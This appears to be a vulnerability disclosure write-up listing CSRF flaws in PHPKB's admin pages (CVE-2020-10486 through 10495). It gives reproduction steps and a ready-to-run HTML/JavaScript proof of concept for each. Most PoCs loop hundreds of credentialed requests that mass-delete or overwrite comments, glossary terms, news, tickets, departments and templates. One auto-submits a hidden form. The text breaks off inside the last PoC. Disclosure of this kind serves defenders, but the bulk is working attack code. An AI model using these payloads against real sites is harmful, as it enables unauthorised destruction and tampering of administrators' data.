<h2 id="cross-site-request-forgery-when-deleting-a-comment-cve-2020-10486">Cross-Site Request Forgery when deleting a comment (CVE-2020-10486)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-comments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>post a comment on a random article;</li>
  <li>log-in as a Superuser;</li>
  <li>go under “comments” and click on “pending”;</li>
  <li>select the comment and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">comments</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span><span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-comments.php?cid=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-glossary-term-cve-2020-10487">Cross-Site Request Forgery when deleting a glossary term (CVE-2020-10487)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “manage”;</li>
  <li>select the glossary term and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">glossary</span> <span class="nx">terms</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-glossary.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-news-article-cve-2020-10488">Cross-Site Request Forgery when deleting a news article (CVE-2020-10488)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “news” and click on “manage”;</li>
  <li>select the news article and click on “Delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">article</span> <span class="nx">news</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-news.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-ticket-cve-2020-10489">Cross-Site Request Forgery when deleting a ticket (CVE-2020-10489)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-tickets.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “open”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">tickets</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-tickets.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-a-department-cve-2020-10490">Cross-Site Request Forgery when deleting a department (CVE-2020-10490)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “departments”;</li>
  <li>select the department and click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">news</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-departments.php?id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-adding-a-department-cve-2020-10491">Cross-Site Request Forgery when adding a department (CVE-2020-10491)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-departments.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tickets” and click on “departments”;</li>
  <li>type a department name and click on “save”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- The name of the Department term is written in the name parameter --&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/manage-departments.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="na">value=</span><span class="s">"dsa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"submit&amp;#95;department"</span> <span class="na">value=</span><span class="s">"Save&amp;#32;Department"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-deleting-an-article-template-cve-2020-10492">Cross-Site Request Forgery when deleting an article template (CVE-2020-10492)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-templates.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “article templates”;</li>
  <li>click on “delete”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span><span class="nx">This</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Article</span> <span class="nx">Templates</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">deleted</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/manage-templates.php?status=&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;action=del</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-glossary-term-cve-2020-10493">Cross-Site Request Forgery when editing a glossary term (CVE-2020-10493)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-glossary.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “glossary” and click on “manage”;</li>
  <li>click on “edit” and then “save glossary”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change visible parameter to yes if you want to make the glossary terms public, else write no--&gt;</span>
<span class="c">&lt;!-- Change the term parameter to edit all the glossary terms' titles--&gt;</span>
<span class="c">&lt;!-- Change the definition parameter to change all the glossary terms' definition--&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">glossary</span> <span class="nx">terms</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-glossary.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">term=testterm&amp;definition=definitionterm&amp;visible=yes&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;submit=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-a-news-article-cve-2020-10494">Cross-Site Request Forgery when editing a news article (CVE-2020-10494)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-news.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “news” and click on “manage”;</li>
  <li>click on “edit” and then “save news article”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change make_visible to yes if you want to make the News public, else write no --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles News --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the News' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">News</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">[PHPKB]/admin/edit-news.php</span><span class="dl">"</span><span class="p">)</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span><span class="o">=</span><span class="kc">true</span><span class="p">;</span>
			<span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">title=titlenews&amp;txtContent=descriptionnews&amp;make_visible=yes&amp;expiry_date=2020-01-24&amp;id=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;p=c29ydD0mb3JkZXI9&amp;directsave=Save</span><span class="dl">"</span>
			<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
			<span class="nx">i</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="nt">&lt;/script&gt;</span>
	<span class="nt">&lt;/head&gt;</span>
	<span class="nt">&lt;body&gt;</span>
		<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Requests are going!<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<h2 id="cross-site-request-forgery-when-editing-an-article-template-cve-2020-10495">Cross-Site Request Forgery when editing an article template (CVE-2020-10495)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/edit-template.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “articles” and click on “manage templates”;</li>
  <li>click on “edit” and then click on “save article template”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="c">&lt;!-- Change type parameter to public if you want to make the categories public, else write private --&gt;</span>
<span class="c">&lt;!-- Change the title parameter to edit all the titles --&gt;</span>
<span class="c">&lt;!-- Change the txtContent parameter to change all the Article Templates' description --&gt;</span>
	<span class="nt">&lt;head&gt;</span>
		<span class="nt">&lt;title&gt;</span>Exploit CSRF!<span class="nt">&lt;/title&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">)</span> <span class="p">{</span> <span class="o">&lt;!--</span> <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">Article</span> <span class="nx">Templates</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">edited</span> <span class="o">--&gt;</span>
			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span> 
